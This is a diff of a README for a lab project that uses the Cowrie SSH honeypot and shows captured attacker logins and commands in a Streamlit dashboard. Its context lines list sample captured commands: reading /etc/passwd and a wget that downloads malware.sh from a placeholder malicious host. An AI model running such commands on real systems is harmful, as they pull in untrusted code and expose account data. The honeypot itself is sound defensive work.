@@ -1,6 +1,6 @@
 #Cowrie Honeypot Dashboard
 ## Overview
-This project uses Cowrie to simulate and monitor SSH attacker activity in a controlled lab environment.
+A cybersecurity lab project that uses Cowrie honeypot to capture SSH attacker behavior, parse Cowrie JSON logs with Python, and visualize attacker IPs and command activity in a Streamlit dashboard.
 ## Feature
 - Captures attacker login attempts
 - Logs attacker commands
@@ -23,7 +23,7 @@ This project uses Cowrie to simulate and monitor SSH attacker activity in a cont
 - cat /etc/passwd
 - wget http://malicious.com/malware.sh
 
-## Sample Output
+## Sample Dashboard
 ![Top Commands] (screenshots/commands.png)
 
 ## Files
